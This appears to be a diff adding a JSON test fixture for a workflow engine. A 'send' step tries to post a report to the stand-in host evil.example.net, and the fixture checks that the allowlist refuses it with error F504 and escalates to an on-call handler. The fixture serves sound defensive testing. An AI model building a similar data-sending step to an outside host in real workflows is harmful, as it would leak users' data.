@@ -1,0 +1,138 @@
+{
+  "description": "The destination refusal is an F504 a failure mode can match with on_error: it escalates to the handler (\u00a74.4.2, \u00a75.12).",
+  "catalog": {
+    "w": {
+      "goal": "g",
+      "risk": "high",
+      "spec_version": "1.1",
+      "steps": [
+        {
+          "capability": "checkpoint",
+          "purpose": "checkpoint step",
+          "store_as": "cp",
+          "input_bindings": {
+            "scope": "report_state"
+          }
+        },
+        {
+          "capability": "send",
+          "purpose": "send step",
+          "store_as": "s",
+          "input_bindings": {
+            "destination": "https://evil.example.net/x",
+            "payload": {
+              "report": 1
+            }
+          },
+          "failure_modes": [
+            {
+              "condition": "the destination is not allowed",
+              "on_error": "F504",
+              "action": "escalate",
+              "recovery": {
+                "goto_step": "page"
+              }
+            }
+          ]
+        },
+        {
+          "capability": "invoke",
+          "purpose": "invoke step",
+          "store_as": "page",
+          "handler": true,
+          "workflow_id": "oncall",
+          "input_bindings": {
+            "workflow": "oncall",
+            "input": {
+              "why": "a send was refused"
+            }
+          }
+        }
+      ],
+      "workflow_extensions": {
+        "requires": [
+          "recovery@1"
+        ]
+      }
+    },
+    "oncall": {
+      "goal": "g",
+      "risk": "high",
+      "spec_version": "1.1",
+      "steps": [
+        {
+          "capability": "inquire",
+          "purpose": "inquire step",
+          "store_as": "q",
+          "input_bindings": {
+            "ambiguous_input": "${why}"
+          }
+        }
+      ],
+      "inputs": {
+        "why": {
+          "type": "string",
+          "required": true
+        }
+      }
+    }
+  },
+  "header": null,
+  "workflow": "w",
+  "inputs": {},
+  "attendance": "attended",
+  "start": 0,
+  "script": [
+    {
+      "expect": {
+        "kind": "InvokeCapability",
+        "capability": "checkpoint",
+        "step": 0
+      },
+      "respond": {
+        "kind": "Output",
+        "value": {
+          "checkpoint_id": "cp1",
+          "evidence_anchors": []
+        }
+      }
+    },
+    {
+      "expect": {
+        "kind": "InvokeCapability",
+        "capability": "inquire",
+        "frame": [
+          "w",
+          "oncall"
+        ],
+        "inputs": {
+          "ambiguous_input": "a send was refused"
+        }
+      },
+      "respond": {
+        "kind": "Output",
+        "value": {
+          "questions": [],
+          "ambiguity_analysis": {},
+          "confidence": 1,
+          "evidence_anchors": []
+        }
+      }
+    }
+  ],
+  "end": {
+    "kind": "Completed",
+    "outcome": "escalated",
+    "cause": "F504"
+  },
+  "trace_kinds": [
+    "step_failed",
+    "failure_mode_fired",
+    "escalated"
+  ],
+  "destinations": [
+    [
+      "https://hooks.example.com/*"
+    ]
+  ]
+}
